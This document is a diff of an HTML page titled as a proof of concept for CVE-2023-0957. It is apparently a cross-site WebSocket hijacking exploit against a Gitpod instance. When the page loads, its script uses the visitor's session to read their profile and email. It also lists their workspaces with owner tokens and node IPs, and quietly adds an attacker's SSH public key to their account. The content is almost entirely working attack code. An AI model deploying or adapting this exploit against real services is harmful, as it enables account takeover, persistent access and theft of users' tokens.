@@ -52,117 +52,160 @@
             max-height: 300px;
             overflow-y: auto;
         }
+        #workspacesList, #sshKeyList {
+            padding-left: 2rem;
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
+        <h1>CVE-2023-0957 POC</h1>
         <h2>User Information</h2>
-        <div>
-            <p><span class="key">ID:</span> <span class="value" id="userId"></span></p>
-            <p><span class="key">Creation Date:</span> <span class="value" id="creationDate"></span></p>
-            <p><span class="key">Last Verification Time:</span> <span class="value" id="lastVerificationTime"></span></p>
-        </div>
-
         <div>
             <h3>User Profile</h3>
             <div class="user-info">
                 <img id="avatar" class="avatar" src="" alt="User Avatar">
                 <div>
-                    <p><span class="key">Name:</span> <span class="value" id="userName"></span></p>
-                    <p><span class="key">Blocked:</span> <span class="value" id="isBlocked"></span></p>
+                    <p><span class="key">User ID:</span> <span class="value" id="userID"></span></p>
+                    <p><span class="key">Username:</span> <span class="value" id="userName"></span></p>
+                    <p><span class="key">Email:</span> <span class="value" id="userEmail"></span></p>
                 </div>
             </div>
         </div>
 
+        <h2>Workspace Information</h2>
         <div>
-            <h3>Roles & Permissions</h3>
-            <ul id="rolesList" class="list"></ul>
+            <h3>Workspaces</h3>
+            <div id="workspacesList" ></div>
         </div>
 
+        <h2>SSH Information</h2>
         <div>
-            <h3>Additional Data</h3>
-            <div>
-                <h4>Email Notification Settings</h4>
-                <ul id="emailNotificationSettings" class="list"></ul>
-            </div>
-            <div>
-                <h4>IDE Settings</h4>
-                <ul id="ideSettings" class="list"></ul>
-            </div>
+            <h3>SSH Keys</h3>
+            <pre id="sshKeyList" ></pre>
+
+            <div id="addedSSHKey"></div>
         </div>
 
-        <div>
-            <h3>Identities</h3>
-            <pre id="identities"></pre>
-        </div>
     </div>
-<script>
-    const s = new WebSocket("wss://gitpod.mystacs.com/api/gitpod");
-
-    s.addEventListener('open', () => {
-        // WebSocket connection is open, send message
-        s.send(JSON.stringify({
-            jsonrpc: "2.0",
-            id: 1,
-            method: "getLoggedInUser",
-            params: {}
-        }));
-    });
-
-    s.addEventListener('message', (event) => {
-        handleResponse(JSON.parse(event.data));
-    });
-
-
-    s.addEventListener('error', (error) => {
-        console.error("WebSocket error:", error);
-    });
-
-    s.addEventListener('close', () => {
-        console.log("WebSocket connection closed.");
-    });
-
-    function handleResponse(response) {
-
-        // Set user ID and dates
-        document.getElementById("userId").textContent = response.result.id;
-        document.getElementById("creationDate").textContent = new Date(response.result.creationDate).toLocaleString();
-        document.getElementById("lastVerificationTime").textContent = new Date(response.result.lastVerificationTime).toLocaleString();
+    <script>
+        const ws = new WebSocket("wss://gitpod.mystacs.com/api/gitpod");
     
-        // Set avatar and user info
-        document.getElementById("avatar").src = response.result.avatarUrl;
-        document.getElementById("userName").textContent = response.result.name;
-        document.getElementById("isBlocked").textContent = response.result.blocked ? "Yes" : "No";
+        // Store pending requests to match responses
+        const pendingRequests = {};
     
-        // Set roles
-        const rolesList = document.getElementById("rolesList");
-        response.result.rolesOrPermissions.forEach(role => {
-            const li = document.createElement("li");
-            li.textContent = role;
-            rolesList.appendChild(li);
+        ws.addEventListener('open', () => {
+            console.log("WebSocket connection opened.");
+            // Example: Automatically fetch user data
+            sendJsonRpcRequest("getLoggedInUser").then(handleUserResponse);
+            sendJsonRpcRequest("getWorkspaces").then(fetchWorkspaces);
+            sendJsonRpcRequest("addSSHPublicKey", ({"name": "GitpodPOC("+(Math.random() + 1).toString(36).substring(7)+")", "key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCogKP5qUSUPQkBZjBbuisSLU+WyYUmpm9O+cKGgTAQlnsesdJ4ZiV3RfTs31j8UH41yqPTMfDaDohg6TNi3532uL5dC6OUC/pA9F/CoENdukbzkfO7E7t5zvCkNqfT9zVubdEJMRmwppnOREXxy8Ab7RylfoifhRF3djAGA7+4bqOn9LeXxULfRKIA65oHsqJE9U622jbMGq53iTCQhF//bkAkhxKpVL71gJUFWBAnFAlS9fPEmap9DDNXu70BQa79BTcSM8u6VbadvXOBN9OZY8bx8Q6ftuT3xsn/wVelqP+A15JErm1VeF0TRXQ5fvXCb86AL9AGNY4lCweTL9GrYaYo92NjugL2NzfjdHd3ak1eCc1sogiUQ7UovqnOgO6kdp23VoLdH17Je2zECEqbq5PZInMbE36pa9vfkUfxh8IlWIUFIP1kZFRLKBRfkryinIqmhKVmkwMsZpwydRRhsgxqMKp6M7/q9mfKEHDvobNiXyRgYxwfZlD87EPbMHkg+b+1IBx8SCElu8dWDFRU96OGo9/oEjqDBWvROBV66ZXyp3g4a8IuTR3/5ns6upq2FWle2C1sc4fe/e023fmcP72+U8U2fZjPq7HwcPwEv5qCPLlULbO+aQlDq8icWMrddWURx3dCCJFa9+uN1LaBbl8L/jVNtj2BRxLqy16hhw== i589264@HTP7654TXH"})).then(handleSSHKeyAdded);
+            sendJsonRpcRequest("getSSHPublicKeys").then(handleSSH);
         });
     
-        // Set email notification settings
-        const emailSettingsList = document.getElementById("emailNotificationSettings");
-        Object.entries(response.result.additionalData.emailNotificationSettings).forEach(([key, value]) => {
-            const li = document.createElement("li");
-            li.textContent = `${key}: ${value}`;
-            emailSettingsList.appendChild(li);
+        ws.addEventListener('message', (event) => {
+            console.log("Received:", event.data);
+            const response = JSON.parse(event.data);
+            
+            if (response.id && pendingRequests[response.id]) {
+                // Resolve the corresponding request promise
+                pendingRequests[response.id](response);
+                delete pendingRequests[response.id]; // Clean up
+            } else {
+                console.warn("Unexpected response:", response);
+            }
         });
     
-        // Set IDE settings
-        const ideSettingsList = document.getElementById("ideSettings");
-        Object.entries(response.result.additionalData.ideSettings).forEach(([key, value]) => {
-            const li = document.createElement("li");
-            li.textContent = `${key}: ${value}`;
-            ideSettingsList.appendChild(li);
+        ws.addEventListener('error', (error) => {
+            console.error("WebSocket error:", error);
         });
     
-        // Display identities as JSON
-        document.getElementById("identities").textContent = JSON.stringify(response.result.identities, null, 2);
-    };
-</script>
+        ws.addEventListener('close', () => {
+            console.log("WebSocket connection closed.");
+        });
+    
+        function sendJsonRpcRequest(method, params = {}) {
+            return new Promise((resolve, reject) => {
+                const requestId = Date.now() + Math.random(); // Unique ID
+                const request = {
+                    jsonrpc: "2.0",
+                    id: requestId,
+                    method: method,
+                    params: params
+                };
+    
+                pendingRequests[requestId] = resolve; // Store resolver
+                ws.send(JSON.stringify(request));
+            });
+        }
+    
+        /**
+         * Handle the response for "getLoggedInUser" method
+         */
+        function handleUserResponse(response) {
+            if (!response.result) {
+                console.error("Invalid response:", response);
+                return;
+            }
+    
+            document.getElementById("avatar").src = response.result.avatarUrl;
+            document.getElementById("userID").textContent = response.result.id;
+            document.getElementById("userName").textContent = response.result.name;
+            document.getElementById("userEmail").textContent = response.result.identities[0].primaryEmail;
+    
+        }
+    
+        // Example usage: Calling other methods dynamically
+        function fetchWorkspaces(response) {
+            if (!response.result) {
+                console.error("Invalid response:", response);
+                return;
+            }
+
+            const workspacesList = document.getElementById("workspacesList");
+            workspacesList.innerHTML = ""; // Clear previous list items
+
+            response.result.forEach(item => {
+                if (!item.workspace || !item.latestInstance) return; // Ensure required data exists
+
+                const li = document.createElement("div");
+                li.innerHTML = `
+                    <strong>Workspace ID:</strong> ${item.workspace.id} <br>
+                    <strong>Clone URL:</strong> <a href="${item.workspace.cloneUrl}" target="_blank">${item.workspace.cloneUrl}</a> <br>
+                    <strong>IDE URL:</strong> <a href="${item.latestInstance.ideUrl}" target="_blank">${item.latestInstance.ideUrl}</a> <br>
+                    <strong>Pod Name:</strong> ${item.latestInstance.status.podName} <br>
+                    <strong>Node IP:</strong> ${item.latestInstance.status.nodeIp} <br>
+                    <strong>Owner Token:</strong> ${item.latestInstance.status.ownerToken} <br>
+                    <hr>
+                `;
+                workspacesList.appendChild(li);
+            });
+        }
+
+        function handleSSH(response) {
+            if (!response.result) {
+                console.error("Invalid response:", response);
+                return;
+            }
+
+            document.getElementById("sshKeyList").textContent = JSON.stringify(response.result, null, 2);
+        }
+
+        function handleSSHKeyAdded(response) {
+            if (!response.result) {
+                console.error("Invalid response:", response);
+                return;
+            }
+
+            document.getElementById("addedSSHKey").innerHTML = `
+                <strong>Successfully added SSH key to user account with fingerprint: ${response.result.fingerprint}</strong>
+            `;
+
+        }
+    
+    </script>
+    
 
 </body>
 </html>
